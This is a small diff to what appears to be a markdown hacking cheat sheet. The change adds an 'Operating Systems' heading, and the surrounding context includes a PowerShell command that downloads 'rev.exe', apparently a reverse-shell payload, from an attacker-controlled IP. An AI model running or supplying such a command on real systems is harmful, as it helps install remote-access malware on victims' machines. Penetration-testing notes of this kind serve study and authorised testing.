@@ -160,6 +160,9 @@ Download file in Batch Via Powershell Module
 powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' -OutFile '.\rev.exe'"
 ```
 
+
+## Operating Systems
+
 ## Windows 
 > Common Hackable components
 
